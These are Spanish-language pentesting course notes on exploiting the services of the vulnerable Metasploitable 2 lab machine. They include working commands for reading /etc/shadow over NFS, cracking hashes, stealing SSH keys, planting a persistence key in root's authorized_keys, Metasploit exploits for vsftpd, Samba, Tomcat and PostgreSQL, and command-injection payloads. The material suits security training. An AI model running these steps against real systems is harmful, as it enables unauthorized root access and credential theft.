

> [!info] Relacionado con
> [[Metodología de Explotación]] · [[Escalada de Privilegios]] · [[Reverse Shells y Post-Explotación]] · [[Prácticas CTF - HTB y VulnHub]]

---

## ① NFS — Network File System

Puerto **2049**. Permite compartir carpetas Linux por red.

### Flujo de explotación

```bash
# 1. Confirmar que NFS está activo
rpcinfo -p <IP>

# 2. Ver carpetas compartidas
showmount -e <IP>

# 3. Montar la raíz
mkdir ~/Desktop/carpeta_meta2
sudo mount -t nfs <IP>:/ ~/Desktop/carpeta_meta2

# 4. Explorar
cat ~/Desktop/carpeta_meta2/etc/passwd # usuarios
sudo cat ~/Desktop/carpeta_meta2/etc/shadow # hashes
```

> [!danger] PELIGRO
> Compartir `/` desde la raíz expone **todo** el sistema. Cualquier atacante puede leer `/etc/shadow` y modificar `authorized_keys`.

---

## ② Hashes — [[John_Hashcat|John]] y [[John_Hashcat|Hashcat]]

### Identificar tipo de hash

| Prefijo | Tipo | Hashcat modo |
|---------|------|-------------|
| `$1$` | MD5crypt | 500 |
| `$5$` | SHA-256 | 7400 |
| `$6$` | SHA-512 | 1800 |
| `*` | Cuenta deshabilitada | — |
| `!` | Cuenta bloqueada | — |

### [[John_Hashcat|John the Ripper]]

```bash
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt # ver resultados
```

### [[John_Hashcat|Hashcat]]

```bash
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt # MD5crypt
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt # SHA-512
hashcat -m 500 hashes.txt --show # ver resultados
```

| Herramienta | Cuándo usar |
|------------|------------|
| **[[John_Hashcat|John]]** | Más sencillo, detecta formato automáticamente |
| **[[John_Hashcat|Hashcat]]** | GPU → mucho más rápido. Entornos reales. |

---

## ③ SSH por NFS — Robar y crear claves

### Ficheros clave

| Archivo | Función |
|---------|---------|
| `~/.ssh/id_rsa` | Clave **PRIVADA** (la que se roba) |
| `~/.ssh/id_rsa.pub` | Clave pública (la que se deja en el servidor) |
| `~/.ssh/authorized_keys` | Lista de claves públicas autorizadas |

### Vector 1 — Robar clave privada

```bash
cp ~/Desktop/carpeta_meta2/home/msfadmin/.ssh/id_rsa ~/Desktop/id_rsa_robada
chmod 600 ~/Desktop/id_rsa_robada # OBLIGATORIO
ssh -i ~/Desktop/id_rsa_robada root@<IP>
```

### Vector 2 — Crear nuestra clave (persistencia)

```bash
ssh-keygen -t rsa -f ~/Desktop/mi_clave_nueva
# Passphrase: Enter (vacío)

# AÑADIR (>>), NUNCA sobreescribir (>)
cat ~/Desktop/mi_clave_nueva.pub >> ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys

chmod 600 ~/Desktop/mi_clave_nueva
ssh -i ~/Desktop/mi_clave_nueva root@<IP>
```

> [!warning] >> vs >
> `>>` **añade** al final (persistencia).
> `>` **sobreescribe** y destruye accesos existentes.

---

## ④ PostgreSQL — Fuerza bruta y explotación

Puerto **5432**.

```bash
# Fuerza bruta con [[Metasploit]]
[[Metasploit|msfconsole]]
search postgres login
use auxiliary/scanner/postgres/postgres_login
set RHOSTS <IP>
run
# → postgres:postgres (credenciales por defecto)

# Exploit autenticado
search postgres
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS <IP>
set USERNAME postgres
set PASSWORD postgres
run
# → Shell como usuario "postgres"
```

---

## ⑤ Apache Tomcat — Reconocimiento y explotación

Puerto **8180**.

```bash
# Fuerza bruta del manager
search tomcat
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP>
set RPORT 8180
run
# → tomcat:tomcat

# Exploit — subida de WAR
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <IP>
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
run
# → Shell como "tomcat55"
```

---

## ⑥ MySQL — Credenciales en robots.txt

Puerto **3306**.

```bash
# robots.txt → config.inc.php → credenciales en texto claro
mysql -h <IP> -u root -p
# Contraseña: vacía

show databases;
use dvwa;
select * from users;
```

---

## ⑦ Command Injection

```bash
# La app hace: ping -c1 <INPUT>
# Inyección:
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | id
```

| Separador | Comportamiento |
|----------|---------------|
| `;` | Ejecuta siempre ambos |
| `&&` | Ejecuta segundo si primero tiene éxito |
| `|` | Pipe: stdout → stdin |
| `||` | Ejecuta segundo si primero falla |

---

## ⑧ Puerto 21 — FTP: tres vectores (clase 25.05)

El FTP de Metasploitable 2 usa **vsftpd 2.3.4** (detectada con `nmap -sC`), con backdoor conocida desde 2011 (ExploitDB + módulo Metasploit).

### Vector 1 — Sesión anónima

```bash
ftp <IP>
# Usuario: anonymous · sin contraseña
dir # o ls → listar
get fichero # descargar
put fichero # subir
```

> [!danger] PELIGRO DEL ANÓNIMO
> Si esa carpeta del FTP está expuesta en la web, se sube una reverse shell en PHP → ejecución de código remoto. El contexto lo cambia todo.

### Vector 2 — Exploit de la versión (Metasploit)

```bash
msfconsole
search vsftpd 2.3.4
use 0
set RHOSTS <IP>
set LHOST <KALI>
run
# → "backdoor has been spawned" → shell → whoami = root
```

### Vector 3 — Script Python (sin Metasploit)

```bash
# SearchSploit muestra el mismo exploit como script
locate vsftpd
cp /ruta/completa/al/script.py . # no modificar el original
python3 script.py <IP>

# Si va demasiado rápido: nano → import time al inicio
# + time.sleep(2) en la línea de conexión → relanzar
```

> [!important] IDEA CLAVE (25.05)
> Para FTP hay **exactamente tres vectores**: sesión anónima, versión vulnerable y credenciales obtenidas por otro medio. Si ninguno aplica, FTP no ofrece más superficie aislada.

---

## ⑨ Puerto 23 — Telnet: credenciales en texto claro

Protocolo de gestión remota similar a SSH pero **sin cifrado**, obsoleto.

```bash
telnet <IP>
# Metasploitable 2 muestra usuario y contraseña directamente en pantalla
# → msfadmin / msfadmin → whoami = msfadmin (no root)
```

### Escalada desde Telnet (y desde SSH)

```bash
sudo -l # qué puede ejecutar el usuario con permisos de root
# En Metasploitable 2: ALL → todo

sudo su
whoami # → root
```

> [!tip] METÁFORA DE LAS LLAVES
> `sudo -l` es revisar qué llaves tiene el usuario. Si tiene la llave maestra (**ALL**), no hay barrera. Si solo tiene la de un almacén, **GTFOBins** te dice cómo usarla para copiar la maestra.

---

## ⑩ Puerto 22 — SSH: fuerza bruta con Metasploit

```bash
msfconsole
search ssh/login
use 0
set RHOSTS <IP>
set USER_FILE /ruta/usuarios.txt
set PASS_FILE /ruta/passwords.txt
set STOP_ON_SUCCESS true # para al primer acierto
run
```

### Gestión de sesiones de Metasploit

```bash
sessions # listar sesiones guardadas
sessions 1 # entrar en una sesión
Ctrl + Z # dejarla en segundo plano sin cerrarla
```

> [!info] SESIONES PERSISTENTES
> A diferencia del exploit de FTP (que abría sesión automática), el scanner SSH **no abre shell**: guarda sesión activa en Metasploit. Permite mantener múltiples sesiones simultáneas a diferentes máquinas/usuarios.

Una vez dentro como msfadmin: escalada idéntica a Telnet (`sudo -l` → ALL → `sudo su`).

---

## ⑪ Puertos 139/445 — SMB/Samba en Linux (Metasploitable)

SMB implementado en Linux como **Samba**: carpetas, impresoras, ficheros.

```bash
# Enumerar recursos compartidos (sesión anónima)
smbclient -L -N //<IP>/
# -L = listar recursos · -N = sin credenciales
# → tmp, opt, C$, etc.
```

### Obtener la versión de Samba sin Nmap

```bash
msfconsole
search smb version
use 103
set RHOSTS <IP>
run
# → versión exacta de Samba
```

### Exploit de la versión vulnerable

Metasploitable 2 tiene **Samba 3.0.20** — mismo flujo que FTP:

```bash
searchsploit Samba 3.0.20
msfconsole
search Samba 3.0.20
use 0
set RHOSTS <IP>
run
# → sesión directamente como root, sin escalada
```

> [!important] CHECKLIST POR SERVICIO (25.05)
> SMB: enumerar shares con `smbclient` → identificar versión → `searchsploit` → si hay exploit, usarlo; si no, revisar el contenido de las carpetas en busca de credenciales.

---

## Checklist de repaso

- [ ] ¿Sé montar un sistema NFS y explorarlo?
- [ ] ¿Puedo romper hashes con [[John_Hashcat|John]] y [[John_Hashcat|Hashcat]]?
- [ ] ¿Sé robar/crear claves SSH para persistencia?
- [ ] ¿Entiendo la diferencia entre `>>` y `>`?
- [ ] ¿Sé explotar PostgreSQL y Tomcat?
- [ ] ¿Reconozco un Command Injection y sé explotarlo?
- [ ] ¿Sé explotar FTP por los 3 vectores (anónimo, versión, credenciales)?
- [ ] ¿Sé escalar con `sudo -l` → ALL → `sudo su` desde Telnet/SSH?
- [ ] ¿Sé hacer fuerza bruta SSH con Metasploit y gestionar sesiones (`sessions`, Ctrl+Z)?
- [ ] ¿Sé enumerar Samba y obtener su versión sin Nmap?

---

## Enlaces relacionados

- [[comandos/SMB_Impacket]] — Cheat sheet de comandos
- [[comandos/John_Hashcat]] — Cheat sheet de comandos









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
- [[Reverse Shells y Post-Explotación.md|Reverse Shells y Post-Explotación]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
- [[../../apuntes Joselu/PREWORK/resumen_clase13.md|resumen_clase13]] — Linux, Metodologia Pentest, Netcat / Reverse Shells

### 🌐 Cross-Dominio

- [[../../../programacion/Ciberseguridad/wordpress_security.md|wordpress_security]] — Programacion: Criptografia, Linux, SQL
- [[../../../programacion/Go/testing_go.md|testing_go]] — Programacion: Criptografia, Linux, SQL

> #cli #command_injection #crypto #escalada_privilegios #go #hack_the_box #hydra #john_hashcat #linux #linux_ciber #metasploit #netcat #pentest #post_explotacion #redes #redes_ciber #reverse_shell #sql #ssh_tool #vulnhub #windows_ciber
